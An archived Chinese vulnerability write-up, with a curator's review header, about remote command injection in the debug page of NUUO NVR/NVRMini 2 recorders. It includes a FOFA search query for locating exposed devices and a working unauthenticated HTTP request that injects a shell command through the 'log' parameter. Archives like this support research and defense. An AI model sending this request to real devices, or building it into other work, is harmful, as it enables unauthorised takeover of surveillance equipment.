---
source: "MrWQ/vulnerability-paper"
id: "vw-180fc375954fc875933a793d"
entity_id: "ve-180fc375954fc875933a793d"
schema_version: "1"
fofa_unverified: "查询语句"
title: "NUUO 摄像头存在远程命令执行漏洞 附 POC"
product: "NUUO NVR/NVRMini 2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie GET，未列固件或调试组件条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/NUUO/NUUO%20%E6%91%84%E5%83%8F%E5%A4%B4%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/KUCib5T1dkfRPjGztMB3vA"
source_status: "recorded"
---

# NUUO 摄像头存在远程命令执行漏洞 附 POC

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NUUO NVR/NVRMini 2
- 本文讨论：__debugging_center_utils___.php log命令注入
- 版本、权限与配置前提：无Cookie GET，未列固件或调试组件条件
- 资料类型：PoC转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题摄像头而介绍实为网络录像机，影响产品边界不明确
- CVE/CNNVD/CNVD空占位；fofa元数据为查询语句而正文有完整title查询
- 打补丁无公告/版本；工具通过公众号获取而非可审阅附件，宣传尾部多
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 调试页面是否需要认证及所有NVR型号范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KUCib5T1dkfRPjGztMB3vA)

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. NUUO 摄像头简介
-------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

NUUO 摄像头是中国台湾 NUUO 公司旗下的一款网络视频记录器，该设备存在远程命令执行漏洞，攻击者可利用该漏洞执行任意命令，进而获取服务器的权限。

2. 漏洞描述
-------

NUUO 成立于 2004 年，是全球领先的监控解决方案供应商之一，以其可靠性，及 时服务和创新精神而闻名。NUUO 的 VMS 和 NVR 解决方案为 IP 和模拟摄像机提供全面 的记录，监控和无缝第三方解决方案集成。NUUO NVRMini 2 [2] 是具有 NAS 功能的轻巧 便携式 NVR 解决方案。NUUO 摄像头存在远程命令执行漏洞

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

NUUO 监控摄像头

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiayEZPBb2mawMCffeDyl3K338ibiaWCz4vjOkkQs0Sym5n9uYgGJmw9Iiatw/640?wx_fmt=jpeg)NUUO 摄像头存在远程命令执行漏洞

4.fofa 查询语句
-----------

title="Network Video Recorder Login"

5. 漏洞复现
-------

漏洞链接：http://127.0.0.1/__debugging_center_utils___.php?log=;id

漏洞数据包：

```http
GET /__debugging_center_utils___.php?log=;id HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiaynte3o3PRrYiaQeYia62N2d0FxPdZVv3HYUDE17kL8TJia5Chz6KJntq8g/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiay2APpV6kXTrO3q7ctw9OObJZ1xS2lqLjcO9pkdzGBnVJwB0pESsUUxw/640?wx_fmt=jpeg)

6.POC&EXP
---------

关注公众号 南风漏洞复现文库 并回复 漏洞复现 63 即可获得该 POC 工具下载地址：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiayJfoRTgqgwTCwFokibVs4whveLlPLkIWwNS4Uusz5FHlx1HnRx2Ca3zw/640?wx_fmt=jpeg)

本期漏洞及往期漏洞的批量扫描 POC 及 POC 工具箱已经上传知识星球：南风网络安全

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiayLeVuQnrStHKxNnXHpVaibTPkIPPks24EIh5H1DqibyVHtdJu47cTGkAA/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiay5pfBAE37ZVHcKlmSwic092vmXPJ7UmEDaEsbkEtHibryFbEH2iaodQxuA/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yia93EUve4rq1icyDRkdSiaiayjDibaSG4fanj7xEQTYGbzpENkX0DgxJzjFJ2QwEMU7W6BvKrowS4ERQ/640?wx_fmt=jpeg)

7. 整改意见
-------

打补丁

8. 往期回顾
-------

[用友 U8-Cloud 存在任意文件上传漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484349&idx=1&sn=6e04a731795ea303a089509978ea747a&chksm=974b8ebaa03c07ac0fba339a9d349139bc68755e7cd666e10a0a865b19487344e09da98da41f&scene=21#wechat_redirect)  

[泛微 e-office 系统存在 SQL 注入漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484337&idx=1&sn=f9a6ee801435247eebfbcc5e383e5909&chksm=974b8eb6a03c07a08787ab6ed93c7117715dfba07557476e38a4a0d632f3f55e59db12991e42&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
